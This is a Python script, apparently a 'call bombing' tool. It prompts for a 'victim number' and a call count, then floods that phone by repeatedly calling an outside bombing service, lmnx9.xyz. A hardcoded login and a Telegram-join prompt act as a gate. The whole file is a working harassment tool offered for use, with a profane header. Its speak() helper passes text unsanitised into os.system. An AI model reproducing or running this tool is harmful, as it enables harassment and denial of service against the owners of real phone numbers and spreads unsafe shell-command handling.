##FUCK BY MrDevilEx🖕
import os
import sys
import requests
import time
import random
import webbrowser
import uuid

USERNAME = "sifat"
PASSWORD = "facuk"

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

emojis = ['📞', '📲', '☎️', '🔔', '📢', '📡', '⏰', '📳', '🛎️']

def rand_emoji():
    return random.choice(emojis)

def speak(text):
    os.system(f'espeak -a 100 "{text}"')

def banner():
    print(CYAN + """
\x1b[1;97m
    .dP"Y8 88 888888  db  888888 
  \x1b[1;32m  `Ybo." 88 88     dPYb   88   
  \x1b[1;97m  o.`Y8b 88 8888  dP88Yb  88   
   \x1b[1;32m 8bodP' 88 88   dP    Yb 88 \x1b
""" + RESET)
    print(YELLOW + "\n" + "-"*40)
    print(RED + "[ᯤ] DEVELOPER  ▶  " + RESET + "MD. SIFAT HOSSAIN")
    print(RED + "[ᯤ] GITHUB     ▶  " + RESET + "SIFAT404")
    print(RED + "[ᯤ] FEATURE    ▶  " + RESET + "CALL BOMBING")
    print(RED + "[ᯤ] VERSION    ▶  " + RESET + "PAID ≫ 0.1")
    print(YELLOW + "-"*40 + RESET)

def is_user_in_group():
    input(CYAN + "After joining, press Enter to continue... " + rand_emoji() + RESET)
    return True

def approval_system():
    suffix = "<>CALL=bom<>=SIFAT<>"
    os.system("clear")
    banner()
    key_path = "/sdcard/.a.txt"
    # Approve system placeholder

def send_call_boom(number, count):
    url = f"https://lmnx9.xyz/call-boomber/trial.php?number={number}"
    for i in range(count):
        emoji = rand_emoji()
        try:
            response = requests.get(url)
            if response.status_code == 200 and 'success' in response.text.lower():
                print(GREEN + f"[✓] Call {i+1} sent to {number} successfully! {emoji}" + RESET)
            else:
                print(RED + f"[×] Call {i+1} failed or no actual call sent. {emoji}" + RESET)
        except Exception as e:
            print(RED + f"[!] Error: {e} {emoji}" + RESET)
        time.sleep(1)

def main():
    print(GREEN + "Tool Login Panel" + RESET)
    user = input("  Enter Username: ")
    passw = input("  Enter Password: ")
    if user != USERNAME or passw != PASSWORD:
        print(RED + "\nInvalid username or password!" + RESET)
        sys.exit()

    print(GREEN + "\nLogin successful!\n" + RESET)
    os.system("clear")

    approval_system()
    if not is_user_in_group():
        print(RED + "You must join the Telegram group first! Redirecting..." + rand_emoji() + RESET)
        webbrowser.open("https://t.me/+QDHeImK3LwdkN2Fl.Ok.Bro")
        return

    print(CYAN + "Enter victim number (e.g. +8801xxxxxxxxx): " + RESET + rand_emoji())
    number = input("> ")

    speak("Enter victim number " + rand_emoji())

    try:
        total_calls = int(input(CYAN + "How many calls to send: " + RESET + rand_emoji()))
    except:
        total_calls = 10
        print(YELLOW + "Invalid input! Defaulting to 10 calls. " + rand_emoji() + RESET)
        speak("Starting call bombing " + rand_emoji())

    print(YELLOW + f"Starting call boom on {number}... " + rand_emoji() + RESET)
    send_call_boom(number, total_calls)
    speak("Call bombing complete " + rand_emoji())
    print(GREEN + "Done! All calls attempted. " + rand_emoji() + RESET)

if __name__ == "__main__":
    main()